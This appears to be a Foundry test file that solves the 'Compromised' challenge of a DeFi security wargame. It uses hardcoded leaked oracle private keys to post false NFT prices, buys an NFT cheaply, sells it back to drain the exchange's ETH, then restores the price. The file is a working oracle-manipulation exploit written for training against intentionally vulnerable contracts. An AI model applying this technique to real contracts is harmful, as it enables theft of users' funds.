// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/CompromisedFixture.sol";

contract Compromised is CompromisedFixture {
    function setUp() public override {
        super.setUp();
    }

    function test_compromised() public {
        // Code your exploit here

        uint256 priceToSet = 0.01 ether;

        address oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
        address oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);

        vm.startPrank(oracle1);
        trustfulOracle.postPrice("DVNFT", priceToSet);
        vm.stopPrank();

        vm.startPrank(oracle2);
        trustfulOracle.postPrice("DVNFT", priceToSet);
        vm.stopPrank();

        vm.startPrank(attacker);
        exchange.buyOne{value: priceToSet}();

        assertEq(nft.ownerOf(0), attacker);
        vm.stopPrank();

        vm.startPrank(oracle1);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + priceToSet);
        vm.stopPrank();

        vm.startPrank(oracle2);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE + priceToSet);
        vm.stopPrank();

        vm.startPrank(attacker);
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();

        vm.startPrank(oracle1);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(oracle2);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Exchange lost all ETH
        assertEq(address(exchange).balance, 0);
        // Attacker's balance has increased significantly
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);
        // Attacker does not own any NFT
        assertEq(nft.balanceOf(attacker), 0);
        // NFT price hasn't change
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
